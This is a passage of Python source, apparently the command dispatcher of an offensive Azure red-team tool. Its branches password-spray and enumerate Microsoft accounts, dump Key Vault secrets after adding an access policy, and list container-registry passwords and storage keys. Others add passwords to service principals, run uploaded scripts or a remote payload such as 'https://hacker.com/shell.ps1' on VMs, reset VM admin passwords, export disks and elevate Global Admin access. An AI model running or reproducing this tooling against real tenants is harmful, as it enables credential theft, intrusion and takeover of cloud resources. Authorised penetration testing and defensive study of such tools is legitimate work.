                    ''' For any other manual method (Token/SetToken or Token/AuthToken or Token/SPToken)'''
                    print("Refresh token not supported for Token/SetToken or Token/AuthToken or Token/SPToken. Try to login again.")
            elif "Reader/ExposedAppServiceApps" in ExploitChoosen and mode == "run":
                print("Trying to enumerate all external-facing Azure Service Apps..")
                if len(RD_ListExposedWebApps()) < 1:
                    print("No Azure Service Apps were found.")
                else:
                    field_names = ["#", "App Name", "Type", "Status", "Enabled Hostname(s)","Identity"]
                    rows = []
                    AppServiceRecordsCount = 0
                    for AppServiceRecord in RD_ListExposedWebApps():
                        if AppServiceRecord['identity'] == "N/A":
                            AppIdentity = "N/A"
                        else:
                            AppIdentity = AppServiceRecord['identity']['type']
                        rows.append(
                            {"#": AppServiceRecordsCount, "App Name": AppServiceRecord['name'],
                             "Type": AppServiceRecord['kind'], "Status": AppServiceRecord['properties']['state'],
                             "Enabled Hostname(s)": str(AppServiceRecord['properties']['enabledHostNames']),
                             "Identity": AppIdentity}
                        )
                        AppServiceRecordsCount += 1
                    print(make_table(field_names, rows))
            elif "Reader/ListAllAzureContainerRegistry" in ExploitChoosen and mode == "run":
                print("Trying to list all ACR (Azure Container Registry) available in all subscriptions..")
                if len(RD_ListAllACRs()['value']) < 1:
                    print("No Azure Container Registry were found.")
                else:
                    field_names = ["#", "Registry Name", "Location", "Login Server", "AdminEnabled", "CreatedAt"]
                    rows = []
                    ACRRecordsCount = 0
                    for ACRRecord in RD_ListAllACRs()['value']:
                        rows.append(
                            {"#": ACRRecordsCount, "Registry Name": ACRRecord['name'],
                             "Location": ACRRecord['location'], "Login Server": ACRRecord['properties']['loginServer'],
                             "AdminEnabled": ACRRecord['properties']['adminUserEnabled'],
                             "CreatedAt": ACRRecord['properties']['loginServer']}
                        )
                        ACRRecordsCount += 1
                    print(make_table(field_names, rows))
            elif "Contributor/ListACRCredentials" in ExploitChoosen and mode == "run":
                print("Trying to list all users and passwords for ACR (Azure Container Registry)..")
                if len(RD_ListAllACRs()['value']) < 1:
                    print("No Azure Container Registry were found.")
                else:
                    field_names = ["#", "Registry Name", "UserName", "Password(s)"]
                    rows = []
                    ACRRecordsCount = 0
                    for ACRRecord in RD_ListAllACRs()['value']:
                        InfoACR = HLP_GetACRCreds(ACRRecord['id'])
                        rows.append(
                            {"#": ACRRecordsCount, "Registry Name": ACRRecord['name'],
                             "UserName": InfoACR["username"],
                             "Password(s)": str(InfoACR["passwords"])
                             }
                        )
                        ACRRecordsCount += 1
                    print(make_table(field_names, rows))
            elif "Reader/ListAutomationAccounts" in ExploitChoosen and mode == "run":
                print("Trying to enumerate all automation accounts..")
                if len(RD_ListAutomationAccounts()) < 1:
                    print("No Automation accounts were found.")
                else:
                    field_names = ["#", "SubscriptionId", "AccountName", "Location", "Tags"]
                    rows = []
                    AutomationAccountRecordsCount = 0
                    for AutomationAccRecord in RD_ListAutomationAccounts():
                        rows.append(
                            {"#": AutomationAccountRecordsCount, "SubscriptionId": AutomationAccRecord['subscriptionId'],
                             "AccountName": AutomationAccRecord["name"],
                             "Location": AutomationAccRecord["location"],
                             "Tags": str(AutomationAccRecord['tags']),
                             }
                        )
                        AutomationAccountRecordsCount += 1
                    print(make_table(field_names, rows))
            elif "Contributor/ReadVaultSecret" in ExploitChoosen and mode == "run":
                if not hasVaultEnabled:
                    print("ERROR: No Vault Scope Enabled.")
                else:
                    if len(RD_ListAllVaults()) < 1:
                        print("No Vaults were found.")
                    else:
                        print("Trying to list all vaults.. (it might take a few minutes)")
                        field_names = ["#", "Name", "Location", "Type", "Resource Group", "SubscriptionId"]
                        rows = []
                        victims = []
                        vaultRecordCount = 0
                        for VaultRecord in RD_ListAllVaults():
                            victims.append({"name": VaultRecord['name'], "id": VaultRecord['id']})
                            rows.append(
                                {"#": vaultRecordCount, "Name": VaultRecord['name'],
                                 "Location": VaultRecord['location'], "Type": VaultRecord['type'],
                                 "Resource Group": VaultRecord['resourceGroup'],
                                 "SubscriptionId": VaultRecord['subscriptionId']}
                            )
                            vaultRecordCount += 1
                        print(make_table(field_names, rows))
                        TargetVault = input("Select Vault Id [i.e. 0]: ")
                        Selection = int(TargetVault)
                        secretsLoad = HLP_GetSecretsInVault(victims[Selection]['name']).split("|")

                        field_names2 = ["#", "Secret Name", "Secret Value"]
                        rows2 = []
                        vaultSecretRecordCount = 0
                        SecretPathPattren = "https://"+str(victims[Selection]['name'])+".vault.azure.net/secrets/"
                        print("Trying enumerate all "+str(victims[Selection]['name'])+" vault secrets.. ")
                        if 'does not have secrets list permission on key vault' in secretsLoad[1]:
                            print("User does not have secrets list permission. Trying adding access policy.. ")
                            if HLP_AddVaultACL(victims[Selection]['id']):
                                secretsLoadAgain = HLP_GetSecretsInVaultNoStrings(victims[Selection]['name'])
                                for secret in secretsLoadAgain:
                                    rows2.append(
                                        {"#": vaultSecretRecordCount, "Secret Name": secret['id'].replace(SecretPathPattren,""),
                                        "Secret Value": HLP_GetSecretValueTXT(secret['id'])}
                                    )
                                    vaultSecretRecordCount += 1
                            else:
                                print("Failed to create access policy for vault.")
                        else:
                            secretsLoadClean = HLP_GetSecretsInVaultNoStrings(victims[Selection]['name'])
                            for secret in secretsLoadClean:
                                rows2.append(
                                    {"#": vaultSecretRecordCount, "Secret Name": secret['id'].replace(SecretPathPattren, ""),
                                     "Secret Value": HLP_GetSecretValueTXT(secret['id'])}
                                )
                                vaultSecretRecordCount += 1
                        print(make_table(field_names2, rows2))
            elif "Reader/DumpAllRunBooks" in ExploitChoosen and mode == "run":
                print("Trying to dump runbooks codes under available automation accounts (it may takes a few minutes)..")
                print("Keep in mind that it might be noisy opsec..")
                if len(RD_ListRunBooksByAutomationAccounts()) < 1:
                    print("No Runbooks were found.")
                else:
                    ExportedRunBooksRecordsCount = 0
                    DestPath = input("Please enter the path for store the data locally [i.e. C:\\tmp]: ")
                    try:
                        for CurrentRunBookRecord in RD_ListRunBooksByAutomationAccounts():
                            with open(os.path.normpath(DestPath+'\\'+'runbook_'+str(CurrentRunBookRecord['name'])+'.txt'), 'x') as f:
                                f.write(str(RD_DumpRunBookContent(CurrentRunBookRecord['id'])))
                            ExportedRunBooksRecordsCount += 1
                        print("Done. Dumped Total " + str(ExportedRunBooksRecordsCount) + " runbooks to " + str(DestPath))
                    except FileNotFoundError:
                        print("Unable to locate file, please check your path.")
                    except PermissionError:
                        print("There is a permission error with file, please check your permission.")
            elif "Reader/ListAllRunBooks" in ExploitChoosen and mode == "run":
                print("Trying to dump runbooks codes under available automation accounts (it may takes a few minutes)..")
                print("Keep in mind that it might be noisy opsec..")
                if len(RD_ListRunBooksByAutomationAccounts()) < 1:
                    print("No Runbooks were found.")
                else:
                    print("Trying to enumerate all runbooks under available automation accounts..")
                    field_names = ["#", "SubscriptionId", "AutomationAccount", "Runbook Name", "Runbook Type", "Status", "CreatedAt", "UpdatedAt"]
                    rows = []
                    AutomationAccountRecordsCount = 0
                    for RunBookRecord in RD_ListRunBooksByAutomationAccounts():
                        rows.append(
                            {"#": AutomationAccountRecordsCount,
                             "SubscriptionId": RunBookRecord['subscriptionId'],
                             "AutomationAccount": RunBookRecord["automationAccount"],
                             "Runbook Name": RunBookRecord["name"],
                             "Runbook Type": RunBookRecord['properties']['runbookType'],
                             "Status": RunBookRecord['properties']['state'],
                             "CreatedAt": RunBookRecord['properties']['creationTime'],
                             "UpdatedAt": RunBookRecord['properties']['lastModifiedTime'],
                             }
                        )
                        AutomationAccountRecordsCount += 1
                    print(make_table(field_names, rows))
            elif "Reader/ARMTemplatesDisclosure" in ExploitChoosen and mode == "run":
                print("Trying to enumerate outputs and parameters strings from a Azure Resource Manager (ARM)..")
                if len(RD_ListARMTemplates()) < 1:
                    print("No ARM Templates were found.")
                else:
                    print("Skipping SecureString/Object/Array values from list..")
                    field_names = ["#", "Deployment Name", "Parameter Name", "Parameter Value", "Type"]
                    rows = []
                    armRecordCount = 0
                    for ArmTempRecord in RD_ListARMTemplates():
                        for itStr in ArmTempRecord['params']:
                            if ArmTempRecord['params'][itStr]['type'] == "SecureString" or ArmTempRecord['params'][itStr]['type'] == "Array" or ArmTempRecord['params'][itStr]['type'] == "Object":
                                continue
                            rows.append({
                                 "#": armRecordCount,
                                 "Deployment Name": ArmTempRecord['name'],
                                 "Parameter Name": itStr,
                                 "Type": ArmTempRecord['params'][itStr]['type'],
                                 "Parameter Value": ArmTempRecord['params'][itStr]['value']
                            })
                        for itStrO in ArmTempRecord['outputs']:
                            rows.append({
                                "#": armRecordCount,
                                "Deployment Name": ArmTempRecord['name'],
                                "Parameter Name": itStrO,
                                "Type": ArmTempRecord['outputs'][itStrO]['type'],
                                "Parameter Value": ArmTempRecord['outputs'][itStrO]['value']
                            })
                        armRecordCount += 1
                    print(make_table(field_names, rows))
            elif "External/OSINT" in ExploitChoosen and mode == "run":
                target = input("Enter target domain [i.e. example.com]: ")
                field_names = ["#", "Domain", "Location", "Type"]
                rows = []
                subRecordCount = 0
                tenantName = ""
                tenantId = ""
                if len(ENUM_Tenant(target)) == 0:
                    print("The domain " + target + " has no Azure Tenant detected. Abort.")
                else:
                    print("Starting on domain " + target + "...")
                    for domain in ENUM_Tenant(target):
                        rows.append(
                            {"#": subRecordCount, "Domain": domain['domain'],
                             "Location": domain['Location'], "Type": domain['NSType']
                             })
                        tenantId = domain["TenantId"]
                        tenantName = domain['FederationBrandName']
                        subRecordCount += 1
                    print("\nTenant Name: " + tenantName)
                    print("Tenant Id: " + tenantId)
                    print("Found " + str(subRecordCount) + " total valid domains:")
                    print(make_table(field_names, rows))
                    print("Operation Completed.")
            elif "Token/AuthToken" in ExploitChoosen and mode == "run":
                user = input("Enter Username: ")
                pwd = input("Enter Password: ")
                r = sendPOSTRequestSprayMSOL("https://login.microsoft.com/common/oauth2/token", user, pwd, True)
                response = r["json"]
                if 'access_token' in response:
                    print("Credentials OK, continue..")
                    x = DeviceCodeFlow()
                    dc = x["json"]["device_code"]
                    b64_string = response['access_token'].split(".")[1]
                    b64_string += "=" * ((4 - len(response['access_token'].split(".")[1].strip()) % 4) % 4)
                    TenantId = json.loads(base64.b64decode(b64_string))['tid']
                    print("Now follow the next steps to complete the process:")
                    print(x["json"]["message"])
                    while(True):
                        res = DeviceCodeFlowAuthUser(TenantId,dc)["json"]
                        if 'error_description' in res:
                            continue
                        else:
                            if 'expired_token' in res:
                                print("Expired Token, try again!")
                                break
                            else:
                                accessTokenGraph = res
                                initTokenWithGraph(response['access_token'], accessTokenGraph['access_token'])
                                initRefreshToken(response['refresh_token'])
                                print("Captured token!")
                                break
                else:
                    print("Invalid username / password.")
            elif "External/EmailEnum" in ExploitChoosen and mode == "run":
                DestPath = input("Please enter the path for emails [i.e. C:\\emails.txt]: ")
                if DestPath == "":
                    print("Please provide file path.")
                else:
                    technique = input("Choose enum method [1=O365Office, 2=OAuth2]: ")
                    if technique == "" or int(technique) > 2 or int(technique) < 1:
                        print("Please choose valid method.")
                    else:
                        try:
                            if int(technique) == 1:
                                for target in open(os.path.normpath(DestPath), 'r').readlines():
                                    ' based on o365creeper to enumerate via O365 Office API https://github.com/LMGsec/o365creeper'
                                    body = {"username": target.strip()}
                                    r = sendPOSTRequest("https://login.microsoftonline.com/common/GetCredentialType", body, None)
                                    if '"IfExistsResult":1' in r["response"]:
                                        print("The email " + target.strip() + " not found")
                                    else:
                                        print("The email " + target.strip() + " VALID!")
                            elif int(technique) == 2:
                                for target in open(os.path.normpath(DestPath), 'r').readlines():
                                    ' based on MSOLSpray method by @dafthack '
                                    r = sendPOSTRequestSprayMSOL("https://login.microsoft.com/common/oauth2/token", target.strip(),"a123456", False)
                                    error = r["response"]
                                    if "AADSTS50034" in error:
                                        print("The email " + target.strip() + " not found")
                                    else:
                                        print("The email " + target.strip() + " VALID!")
                            else:
                                print("Not supported technique.")
                            print("Completed Operation.")
                        except FileNotFoundError:
                            print("Unable to locate file, please check your path.")
                        except PermissionError:
                            print("There is a permission error with file, please check your permission.")
            elif "External/PasswordSpray" in ExploitChoosen and mode == "run":
                Password = input("Please enter password to spray [i.e. Winter2020]: ")
                if Password == "":
                    print("Please provide password to spray")
                else:
                    DestPath = input("Please enter the path for emails [i.e. C:\\emails.txt]: ")
                    if DestPath == "":
                        print("Please provide emails file path")
                    else:
                        print("Trying each target with password = " + str(Password) + "...")
                        try:
                            for target in open(os.path.normpath(DestPath), 'r').readlines():
                                chk = ENUM_MSOLSpray(target.strip(), Password)
                                if chk is True:
                                    print("Found valid account: " + target.strip() + " / " + Password + "")
                                else:
                                    continue
                            print("Completed Operation.")
                        except FileNotFoundError:
                            print("Unable to locate file, please check your path.")
                        except PermissionError:
                            print("There is a permission error with file, please check your permission.")
            elif "Reader/ListAllUsers" in ExploitChoosen and mode == "run":
                print("Trying to list all users.. (it might take a few minutes)")
                field_names = ["#", "DisplayName", "First", "Last", "mobilePhone", "mail", "userPrincipalName"]
                rows = []
                AllUsersRecordsCount = 0
                for UserRecord in RD_ListAllUsers()['value']:
                    rows.append(
                        {"#": AllUsersRecordsCount,
                         "DisplayName": UserRecord['displayName'],
                         "First": UserRecord['givenName'],
                         "Last": UserRecord['surname'],
                         "mobilePhone": UserRecord['mobilePhone'],
                         "mail": UserRecord['mail'],
                         "userPrincipalName": UserRecord['userPrincipalName']
                         }
                    )
                    AllUsersRecordsCount += 1
                print(make_table(field_names, rows))
            elif "Reader/ListAllStorageAccounts" in ExploitChoosen and mode == "run":
                print("Trying to list all storage accounts.. (it might take a few minutes)")
                if len(RD_ListAllStorageAccounts()) < 1:
                    print("No Storage Accounts were found.")
                else:
                    field_names = ["#", "Name", "Location", "Type", "CustomDomain", "AllowBlobPublicAccess", "AllowSharedKeyAccess", "Resource Group"]
                    rows = []
                    AllStorageAccountRecordsCount = 0
                    for SARecord in RD_ListAllStorageAccounts():
                        rows.append(
                            {"#": AllStorageAccountRecordsCount,
                             "Name":  SARecord['name'],
                             "Location": SARecord['location'],
                             "Type": SARecord['type'],
                             "CustomDomain": SARecord['customDomain'],
                             "AllowBlobPublicAccess": SARecord['properties']['allowBlobPublicAccess'],
                             "AllowSharedKeyAccess": SARecord['allowSharedKeyAccess'],
                             "Resource Group": SARecord['resourceGroup']
                             }
                        )
                        AllStorageAccountRecordsCount += 1
                    print(make_table(field_names, rows))
            elif "Reader/ListStorageAccountsKeys" in ExploitChoosen and mode == "run":
                print("Trying to list all storage accounts keys.. (it might take a few minutes)")
                if len(RD_ListAllStorageAccounts()) < 1:
                    print("No Storage Accounts were found.")
                else:
                    field_names = ["#", "Name", "Location", "Type", "Key", "Value", "Permissions", "Resource Group"]
                    rows = []
                    AllStorageAccountRecordsCount = 0
                    for SARecord in RD_ListAllStorageAccounts():
                        Data = RD_ListAllStorageAccountsKeys(SARecord['id'])
                        for key in Data['keys']:
                            rows.append(
                                {"#": AllStorageAccountRecordsCount,
                                 "Name": SARecord['name'],
                                 "Location": SARecord['location'],
                                 "Type": SARecord['type'],
                                 "Key": key['keyName'],
                                 "Value": key['value'],
                                 "Permissions": key['permissions'],
                                 "Resource Group": SARecord['resourceGroup']
                                 }
                            )
                            AllStorageAccountRecordsCount += 1
                    print(make_table(field_names, rows))
            elif "Reader/ListAllVaults" in ExploitChoosen and mode == "run":
                print("Trying to list all vaults.. (it might take a few minutes)")
                if len(RD_ListAllVaults()) < 1:
                    print("No Vaults were found.")
                else:
                    field_names = ["#", "Name", "Location", "Type", "Resource Group", "SubscriptionId"]
                    rows = []
                    vaultRecordCount = 0
                    for VaultRecord in RD_ListAllVaults():
                        rows.append(
                            {"#": vaultRecordCount, "Name": VaultRecord['name'],
                             "Location": VaultRecord['location'], "Type": VaultRecord['type'],
                             "Resource Group": VaultRecord['resourceGroup'],
                             "SubscriptionId": VaultRecord['subscriptionId']}
                        )
                        vaultRecordCount += 1
                    print(make_table(field_names, rows))
            elif "Reader/ListVirtualMachines" in ExploitChoosen and mode == "run":
                print("Trying to list all virtual machines.. (it might take a few minutes)")
                if len(RD_ListAllVMs()) < 1:
                    print("No VMs were found.")
                else:
                    field_names = ["#", "Name", "Location", "PublicIP", "ResourceGroup", "Identity", "SubscriptionId"]
                    rows = []
                    AllVMRecordsCount = 0
                    for UserVMRecord in RD_ListAllVMs():
                        if UserVMRecord['identity'] == "N/A":
                            VMIdentity = "N/A"
                        else:
                            VMIdentity = UserVMRecord['identity']['type']
                        if HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'], UserVMRecord['resourceGroup'],UserVMRecord['name']) == "N/A":
                            rows.append(
                                {"#": AllVMRecordsCount,
                                 "Name": UserVMRecord['name'],
                                 "Location": UserVMRecord['location'],
                                 "PublicIP": "N/A",
                                 "ResourceGroup": UserVMRecord['resourceGroup'],
                                 "Identity": VMIdentity,
                                 "SubscriptionId": UserVMRecord['subscriptionId']
                                 }
                            )
                        else:
                            rows.append(
                                {"#": AllVMRecordsCount,
                                 "Name": UserVMRecord['name'],
                                 "Location": UserVMRecord['location'],
                                 "PublicIP": HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'],
                                                                 UserVMRecord['resourceGroup'], UserVMRecord['name']),
                                 "ResourceGroup": UserVMRecord['resourceGroup'],
                                 "Identity": VMIdentity,
                                 "SubscriptionId": UserVMRecord['subscriptionId']
                                 }
                            )
                        AllVMRecordsCount += 1
                    print(make_table(field_names, rows))
            elif "Reader/ListServicePrincipals" in ExploitChoosen and mode == "run":
                print("Trying to enumerate all service principles (App registrations)..")
                if len(RD_AddAppSecret()) < 1:
                    print("No Apps registrations were found.")
                else:
                    field_names = ["#", "App Name", "AppId", "Domain", "Has Ownership?"]
                    rows = []
                    EntAppsRecordsCount = 0
                    for EntAppsRecord in RD_AddAppSecret()['value']:
                        rows.append(
                            {"#": EntAppsRecordsCount, "App Name": EntAppsRecord['displayName'],
                             "AppId": EntAppsRecord['appId'], "Domain": EntAppsRecord['publisherDomain'],
                             "Has Ownership?": CHK_AppRegOwner(EntAppsRecord['appId'])}
                        )
                        EntAppsRecordsCount += 1
                    print(make_table(field_names, rows))
            elif "Reader/abuseServicePrincipals" in ExploitChoosen and mode == "run":
                print("Trying to enumerate all Enterprise applications (service principals)..")
                if len(RD_AddAppSecret()) < 1:
                    print("No service principals were found.")
                else:
                    field_names = ["#", "App Name", "AppId", "Domain", "Can Abused?"]
                    rows = []
                    EntAppsRecordsCount = 0
                    for EntAppsRecord in RD_AddAppSecret()['value']:
                        print("Trying to register service principle for " + EntAppsRecord['displayName'] + " app..")
                        pwdGen = RD_addPasswordForEntrepriseApp(EntAppsRecord['appId'])
                        if pwdGen == "N/A":
                            rows.append(
                                {"#": EntAppsRecordsCount, "App Name": EntAppsRecord['displayName'],
                                 "AppId": EntAppsRecord['appId'], "Domain": EntAppsRecord['publisherDomain'],
                                 "Can Abused?": "N/A"})
                        else:
                            rows.append(
                                {"#": EntAppsRecordsCount, "App Name": EntAppsRecord['displayName'],
                                 "AppId": EntAppsRecord['appId'], "Domain": EntAppsRecord['publisherDomain'],
                                 "Can Abused?": pwdGen})
                        EntAppsRecordsCount += 1
                    print(make_table(field_names, rows))
            elif "Contributor/DumpWebAppPublishProfile" in ExploitChoosen and mode == "run":
                print("Trying to enumerate app service sites.. (it might take a few minutes)")
                if len(RD_ListAllDeployments()) < 1:
                    print("No deployments were found.")
                else:
                    field_names = ["#", "ProfileName", "User", "Password", "Host"]
                    rows = []
                    AllDepolymentsRecordsCount = 0
                    for DeploymentRecord in RD_ListAllDeployments():
                        print("Enumerate strings for site " + DeploymentRecord['name'] + " ...")
                        DataStrings = CON_GetPublishProfileBySite(DeploymentRecord['id'])
                        if "Failed to parse deployment template" in DataStrings:
                            print(DataStrings)
                            continue
                        else:
                            for data in DataStrings:
                                rows.append(
                                    {"#": AllDepolymentsRecordsCount, "ProfileName": data['name'],
                                     "User": DeploymentRecord['user'], "Password": DeploymentRecord['pwd'],
                                     "Host": DeploymentRecord['host']}
                                )
                            AllDepolymentsRecordsCount += 1
                    print(make_table(field_names, rows))
            elif "Reader/ListAppServiceSites" in ExploitChoosen and mode == "run":
                print("Trying to enumerate app service sites.. (it might take a few minutes)")
                if len(RD_ListAllDeployments()) < 1:
                    print("No deployments were found.")
                else:
                    field_names = ["#", "SiteName", "Location", "Type", "Status"]
                    rows = []
                    AllDepolymentsRecords = 0
                    for DeploymentRecord in RD_ListAllDeployments():
                        rows.append(
                            {"#": AllDepolymentsRecords, "SiteName": DeploymentRecord['name'],
                             "Location": DeploymentRecord['location'], "Type": DeploymentRecord['type'],
                             "Status": DeploymentRecord['properties']['state']}
                        )
                        AllDepolymentsRecords += 1
                    print(make_table(field_names, rows))
            elif "Contributor/RunCommandVM" in ExploitChoosen and mode == "run":
                print("Trying to list exposed virtual machines.. (it might take a few minutes)")
                if len(RD_ListAllVMs()) < 1:
                    print("No VMs were found.")
                else:
                    victims = {}
                    field_names = ["#", "Name", "Location", "PublicIP", "OSType", "Identity", "ResourceGroup","SubscriptionId"]
                    rows = []
                    AllVMRecordsCount = 0
                    for UserVMRecord in RD_ListAllVMs():
                        CurrentNetworkInterface = UserVMRecord['properties']['networkProfile']['networkInterfaces']
                        for nic in CurrentNetworkInterface:
                            for ip in HLP_GetAzVMPublicIPNew(nic['id'])['properties']['ipConfigurations']:
                                if 'publicIPAddress' not in ip['properties']:
                                    continue
                                else:
                                    if UserVMRecord['identity'] == "N/A":
                                        VMIdentity = "N/A"
                                    else:
                                        VMIdentity = UserVMRecord['identity']['type']
                                        
                                    if HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'],UserVMRecord['resourceGroup'],ip['properties']['publicIPAddress']['name']) == "N/A":
                                        continue
                                    else:
                                        victims[AllVMRecordsCount] = {"name": UserVMRecord['name'],
                                                                    "os": UserVMRecord['properties']['storageProfile']['osDisk']['osType'], "location": UserVMRecord['location'],
                                                                    "subId": UserVMRecord['subscriptionId'],
                                                                    "rg": UserVMRecord['resourceGroup']}
                                        rows.append(
                                            {"#": AllVMRecordsCount,
                                            "Name": UserVMRecord['name'],
                                            "Location": UserVMRecord['location'],
                                            "PublicIP": HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'],UserVMRecord['resourceGroup'],ip['properties']['publicIPAddress']['name']),
                                            "OSType": UserVMRecord['properties']['storageProfile']['osDisk']['osType'],
                                            "ResourceGroup": UserVMRecord['resourceGroup'],
                                            "Identity": VMIdentity,
                                            "SubscriptionId": UserVMRecord['subscriptionId']
                                            }
                                        )
                                    AllVMRecordsCount += 1
                    print(make_table(field_names, rows))
                    TargetVM = input("Select Target VM Name [i.e. 0]: ")
                    Selection = int(TargetVM)
                    CmdVMPath = input("Enter Path for Script [i.e. C:\exploit\shell.ps1|.sh]: ")
                    try:
                        with open(os.path.normpath(CmdVMPath)) as f:
                            CmdFileContent = f.read()
                        print(CON_VMRunCommand(victims[Selection]["subId"],victims[Selection]["rg"],victims[Selection]["os"],victims[Selection]["name"], CmdFileContent))
                    except FileNotFoundError:
                        print("Unable to locate file, please check your path.")
                    except PermissionError:
                        print("There is a permission error with file, please check your permission.")
            elif "Contributor/VMDiskExport" in ExploitChoosen and mode == "run":
                print("Trying to list deallocated virtual machines.. (it might take a few minutes)")
                if len(RD_ListAllVMs()) < 1:
                    print("No VMs were found.")
                else:
                    victims = {}
                    field_names = ["#", "Name", "Location", "DiskName", "VM Status"]
                    rows = []
                    AllVMRecordsCount = 0
                    for UserVMRecord in RD_ListAllVMs():
                            VMState = HLP_GetVMInstanceView(UserVMRecord['subscriptionId'],UserVMRecord['resourceGroup'],UserVMRecord['name'])
                            if VMState != "PowerState/deallocated":
                                continue
                            else:
                                victims[AllVMRecordsCount] = {"name": UserVMRecord['name'], "location": UserVMRecord['location'], "diskName": UserVMRecord['properties']['storageProfile']['osDisk']['name'],"subId": UserVMRecord['subscriptionId'],"rg": UserVMRecord['resourceGroup']}
                                rows.append(
                                    {"#": AllVMRecordsCount,
                                    "Name": UserVMRecord['name'],
                                    "Location": UserVMRecord['location'],
                                    "DiskName": UserVMRecord['properties']['storageProfile']['osDisk']['name'],
                                    "VM Status": VMState
                                    }
                                )
                            AllVMRecordsCount += 1
                    if len(rows) > 0:
                        print(make_table(field_names, rows))
                        TargetVM = input("Select Target DiskVM [i.e. 0]: ")
                        print("Create a SAS link for VHD download...")
                        Selection = int(TargetVM)
                        print(CON_GenerateVMDiskSAS(victims[Selection]["subId"], victims[Selection]["rg"], victims[Selection]["diskName"]))
                    else:
                        print("No deallocated / stopped VMs were found.")
            elif "Contributor/VMExtensionExecution" in ExploitChoosen and mode == "run":
                print("Trying to list exposed virtual machines.. (it might take a few minutes)")
                if len(RD_ListAllVMs()) < 1:
                    print("No VMs were found.")
                else:
                    victims = {}
                    field_names = ["#", "Name", "Location", "PublicIP", "adminUsername", "ResourceGroup","SubscriptionId"]
                    rows = []
                    AllVMRecordsCount = 0
                    for UserVMRecord in RD_ListAllVMs():
                        CurrentNetworkInterface = UserVMRecord['properties']['networkProfile']['networkInterfaces']
                        for nic in CurrentNetworkInterface:
                            for ip in HLP_GetAzVMPublicIPNew(nic['id'])['properties']['ipConfigurations']:
                                if 'publicIPAddress' not in ip['properties']:
                                    continue
                                else:
                                    if UserVMRecord['identity'] == "N/A":
                                        VMIdentity = "N/A"
                                    else:
                                        VMIdentity = UserVMRecord['identity']['type']
                                        
                                    if HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'],UserVMRecord['resourceGroup'],ip['properties']['publicIPAddress']['name']) == "N/A":
                                        continue
                                    else:
                                        victims[AllVMRecordsCount] = {"name": UserVMRecord['name'],
                                                                    "username": UserVMRecord['properties']['osProfile']['adminUsername'], 
                                                                    "location": UserVMRecord['location'],
                                                                    "subId": UserVMRecord['subscriptionId'],
                                                                    "rg": UserVMRecord['resourceGroup']}
                                        rows.append(
                                            {"#": AllVMRecordsCount,
                                            "Name": UserVMRecord['name'],
                                            "Location": UserVMRecord['location'],
                                            "PublicIP": HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'],UserVMRecord['resourceGroup'],ip['properties']['publicIPAddress']['name']),
                                            "adminUsername": UserVMRecord['properties']['osProfile']['adminUsername'],
                                            "ResourceGroup": UserVMRecord['resourceGroup'],
                                            "SubscriptionId": UserVMRecord['subscriptionId']
                                            }
                                        )
                                    AllVMRecordsCount += 1
                    if len(rows) > 0:
                        print(make_table(field_names, rows))
                        TargetVM = input("Select Target VM Name [i.e. 0]: ")
                        RemotePayload = input("Enter Remote Payload [i.e. https://hacker.com/shell.ps1]: ")
                        Selection = int(TargetVM)
                        print(CON_VMExtensionExecution(victims[Selection]["subId"], victims[Selection]["location"],
                                                    victims[Selection]["rg"], victims[Selection]["name"], RemotePayload))
                    else:
                        print("No VMs with public IP were found.")
            elif "Contributor/VMExtensionResetPwd" in ExploitChoosen and mode == "run":
                print("Trying to list exposed virtual machines.. (it might take a few minutes)")
                if len(RD_ListAllVMs()) < 1:
                    print("No VMs were found.")
                else:
                    victims = {}
                    field_names = ["#", "Name", "Location", "PublicIP", "adminUsername", "ResourceGroup","SubscriptionId"]
                    rows = []
                    AllVMRecordsCount = 0
                    for UserVMRecord in RD_ListAllVMs():
                        CurrentNetworkInterface = UserVMRecord['properties']['networkProfile']['networkInterfaces']
                        for nic in CurrentNetworkInterface:
                            for ip in HLP_GetAzVMPublicIPNew(nic['id'])['properties']['ipConfigurations']:
                                if 'publicIPAddress' not in ip['properties']:
                                    continue
                                else:
                                    if UserVMRecord['identity'] == "N/A":
                                        VMIdentity = "N/A"
                                    else:
                                        VMIdentity = UserVMRecord['identity']['type']
                                        
                                    if HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'],UserVMRecord['resourceGroup'],ip['properties']['publicIPAddress']['name']) == "N/A":
                                        continue
                                    else:
                                        victims[AllVMRecordsCount] = {"name": UserVMRecord['name'],
                                                                    "username": UserVMRecord['properties']['osProfile']['adminUsername'], 
                                                                    "location": UserVMRecord['location'],
                                                                    "subId": UserVMRecord['subscriptionId'],
                                                                    "rg": UserVMRecord['resourceGroup']}
                                        rows.append(
                                            {"#": AllVMRecordsCount,
                                            "Name": UserVMRecord['name'],
                                            "Location": UserVMRecord['location'],
                                            "PublicIP": HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'],UserVMRecord['resourceGroup'],ip['properties']['publicIPAddress']['name']),
                                            "adminUsername": UserVMRecord['properties']['osProfile']['adminUsername'],
                                            "ResourceGroup": UserVMRecord['resourceGroup'],
                                            "SubscriptionId": UserVMRecord['subscriptionId']
                                            }
                                        )
                                    AllVMRecordsCount += 1
                    if len(rows) > 0:
                        print(make_table(field_names, rows))
                        TargetVM = input("Select Target VM Name [i.e. 0]: ")
                        Selection = int(TargetVM)
                        print(CON_VMExtensionResetPwd(victims[Selection]["subId"],victims[Selection]["location"],victims[Selection]["rg"],victims[Selection]["name"], victims[Selection]["username"]))
                    else:
                        print("No VMs with public IP were found.")
            elif "GlobalAdministrator/elevateAccess" in ExploitChoosen and mode == "run":
                print("Elevating access to the root management group..")
                print(GA_ElevateAccess())
                print("Listing Target Subscriptions..")
                listSubs = ListSubscriptionsForToken()
                if listSubs.get('value') == None:
                    print("Exploit Failed: Error occured. Result: " + str(listSubs['error']['message']))
                else:
                    field_names = ["#", "SubscriptionId", "displayName", "State", "Plan", "spendingLimit"]
                    rows = []
                    victims = {}
                    subRecordCount = 0
                    for subRecord in listSubs['value']:
                        victims[subRecordCount] = {"name": subRecord['displayName']}
                        rows.append(
                            {"#": subRecordCount, "SubscriptionId": subRecord['subscriptionId'],
                             "displayName": subRecord['displayName'], "State": subRecord['state'],
                             "Plan": subRecord['subscriptionPolicies']['quotaId'],
                             "spendingLimit": subRecord['subscriptionPolicies']['spendingLimit']}
                        )
                        subRecordCount += 1
